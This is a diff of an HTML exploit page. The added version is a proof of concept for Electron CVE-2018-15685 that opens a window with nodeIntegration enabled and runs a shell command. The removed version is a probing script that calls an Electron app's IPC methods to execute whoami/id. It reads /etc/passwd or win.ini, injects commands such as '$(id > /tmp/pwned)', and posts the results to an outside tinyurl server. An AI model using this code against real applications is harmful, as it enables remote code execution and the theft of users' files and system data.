@@ -1,52 +1,21 @@
 <!DOCTYPE html>
+<html>
+<head>
+  <title>Electron CVE-2018-15685 RCE PoC</title>
+</head>
 <body>
+  <h1>Exploit Launcher</h1>
+  <button onclick="trigger()">Click to Exploit</button>
+
   <script>
-    const SERVER = 'https://tinyurl.com/yz885dsu'; // Replace this!
-
-    // 1. Dump window properties
-    const keys = Object.keys(window).filter(k => typeof window[k] === 'object');
-    fetch(`${SERVER}/window`, { method: 'POST', body: JSON.stringify(keys) });
-
-    // 2. Check for common IPC objects
-    const suspects = ['electron', 'ipc', 'bridge', 'api', 'main'];
-    suspects.forEach(name => {
-      if (window[name]) {
-        fetch(`${SERVER}/hit?name=${name}`);
-      }
-    });
-
-    // 3. Test IPC methods
-    const methodsToTest = ['send', 'invoke', 'openFile', 'exec'];
-    if (window.electron) {
-      methodsToTest.forEach(method => {
-        if (typeof window.electron[method] === 'function') {
-          const cmd = navigator.platform.includes('Win') ? 'whoami' : 'id';
-          window.electron[method](cmd)
-            .then(output => fetch(`${SERVER}/${method}`, { body: output }))
-            .catch(e => fetch(`${SERVER}/error`, { body: e.message }));
-        }
-      });
+    function trigger() {
+      const win = window.open('', '', 'nodeIntegration=yes');
+      win.document.write(`
+        <script>
+          require('child_process').exec('open -a Calculator');
+        <\/script>
+      `);
     }
-
-    // 4. File read and command injection
-    const isWindows = navigator.platform.includes('Win');
-    const filePath = isWindows ? 'C:\\Windows\\win.ini' : '/etc/passwd';
-    const payload = isWindows ? '& whoami > C:\\pwned.txt' : '$(id > /tmp/pwned)';
-
-    if (window.api?.openFile) {
-      // Read file
-      window.api.openFile(filePath)
-        .then(data => fetch(`${SERVER}/file`, { body: data }))
-        .catch(e => {});
-
-      // Command injection
-      window.api.openFile(payload)
-        .catch(e => {});
-    }
-
-    // 5. System info
-    const sysInfo = { /* ... */ };
-    fetch(`${SERVER}/sysinfo`, { method: 'POST', body: JSON.stringify(sysInfo) });
   </script>
 </body>
 </html>
